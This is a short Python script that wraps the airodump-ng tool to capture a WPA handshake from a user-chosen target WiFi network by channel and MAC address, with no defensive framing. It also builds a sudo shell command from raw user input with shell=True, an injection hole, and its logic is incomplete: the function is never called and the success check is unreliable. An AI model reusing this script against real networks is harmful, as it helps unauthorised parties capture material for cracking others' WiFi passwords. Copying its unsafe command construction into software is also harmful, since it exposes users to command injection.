# ------ [ Moduly ] ------ #
import os
import time
import subprocess
# ------ [ Moduly ] ----- #


def ShakeIt():
    # ----- [ Inputy ]  ----- #
    ChannelInput = str(input("Write WiFi Channel : "))
    TargetMacAddress = str(input("Write MacAddress of Target WiFi : "))
    # ------ [ Inputy ]  ----- #

    # ------ [ Catching HandShake ]  ----- #
    CaptureHand = f"sudo airodump-ng -c{ChannelInput} -d {TargetMacAddress} wlan1"
    CatchIt = subprocess.run([CaptureHand], capture_output=True, text=True, shell=True)
    output = CatchIt.stdout
    if "handshake" in output:
        print("Sucessfully Captured WiFi HandShake file")
    else:
        pass


    # ------ [ Catching HandShake ]  ----- #
